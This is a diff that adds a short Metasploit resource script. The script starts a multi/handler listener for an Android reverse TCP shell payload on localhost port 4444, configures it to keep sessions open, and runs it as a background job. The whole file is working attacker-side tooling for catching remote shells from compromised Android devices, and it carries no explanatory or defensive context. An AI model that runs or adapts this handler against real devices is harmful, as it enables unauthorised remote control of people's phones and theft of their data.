@@ -1,0 +1,9 @@
+# Interactive handler — stays at prompt after job start (NO sleep, NO exit)
+use exploit/multi/handler
+set PAYLOAD android/shell/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+set ExitOnSession false
+set SessionRetryTotal 0
+set StagerRetryCount 10
+exploit -j
